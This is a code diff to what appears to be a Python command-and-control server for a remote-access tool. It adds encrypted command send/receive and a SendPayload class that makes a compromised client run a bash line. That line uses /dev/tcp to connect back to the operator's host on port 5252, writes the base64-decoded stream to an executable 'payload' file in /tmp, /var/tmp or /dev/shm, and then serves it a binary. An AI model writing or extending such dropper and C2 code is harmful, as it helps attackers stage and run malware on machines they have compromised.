@@ -2,6 +2,7 @@ from modules.crypt import ServerPyEncryption
 
 from modules.utils import NO_OUTPUT_SIGNAL
 from threading import Thread # change this later
+from base64 import b64encode
 import threading
 import logging
 import select
@@ -159,10 +160,11 @@ class PyServerSocket():
         self.client_socket = None
         self.client_address = None
         self.is_open = True
+        self.derived_key = None
         self.lock = threading.Lock()
 
     def listen(self):
-        logging.info(f"Started listener on {self.server_address, self.server_port}")
+        logging.debug(f"Started listener on {self.server_address, self.server_port}")
         self.server_socket.listen(1)
         self.client_socket, self.client_address = self.server_socket.accept()
         logging.debug(f"Connection established with {self.client_address}")
@@ -179,15 +181,20 @@ class PyServerSocket():
             return True
         else:
             return False
+    
+    def send_msg(self, msg):
+        with self.lock:
+            self.derived_key = self.crypto.get_derived_key(self.client_socket)
+            message_length, message = self.crypto.encrypt_message(msg, self.derived_key)
 
-    def send_command(self, command):
+            self.client_socket.sendall(message_length.to_bytes(4, byteorder="big"))
+            self.client_socket.sendall(message)
+            
+        return True
+    
+    def recv_msg(self):
         with self.lock:
             chunk = b""
-            derived_key = self.crypto.get_derived_key(self.client_socket)
-
-            encrypted_message = self.crypto.encrypt_message(command, derived_key)
-            
-            self.client_socket.sendall(encrypted_message)
             data_length_bytes = self.client_socket.recv(4)
             data_length = int.from_bytes(data_length_bytes, byteorder="big")
             data_bytes = bytearray()
@@ -198,9 +205,50 @@ class PyServerSocket():
                     raise RuntimeError("socket connection broken")
                 data_bytes.extend(chunk)
 
+        return self.crypto.decrypt_message(bytes(data_bytes), self.derived_key)
 
-            return self.crypto.decrypt_message(chunk, derived_key)
+    def send_command(self, msg):
+        '''TODO CHANGE THIS TO SEND LARGE DATA IN CHUNKS'''
+        self.send_msg(msg)
+        msg = self.recv_msg()
+        
+        if b"[Errno " in msg:
+            is_err = True
+        else:
+            is_err = False
+            
+        return [is_err, msg]
+
 
     def close(self):
         self.client_socket.close()
         self.server_socket.close()
+
+class SendPayload():
+    def __init__(self, main_socket, sock_type=socket.SOCK_STREAM):
+        self.server_socket = socket.socket(socket.AF_INET, sock_type)
+        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.client_socket = None
+        self.client_address = None
+        self.main_socket = main_socket
+        self.host = None
+        
+    def listen(self, host):
+        self.host = host
+        self.server_socket.bind((host, 5252))
+        self.server_address, self.server_port = self.server_socket.getsockname()
+
+        self.server_socket.listen(1)
+        test = self.main_socket.client_socket.send(f"bash -c \"cd /tmp || cd /var/tmp || cd /dev/shm ; exec 3<>/dev/tcp/{self.host}/5252 ; cat <&3 | base64 -d > payload; chmod +x payload\"\n".encode())
+
+        self.client_socket, self.client_address = self.server_socket.accept()
+        logging.debug(f"Connection established with {self.client_address}")
+
+    def send_file(self, file_name):
+
+        with open(file_name, "rb") as f:
+            binary_data = f.read()
+
+        base64_data = b64encode(binary_data)
+        self.client_socket.sendall(base64_data)
+        self.client_socket.close()
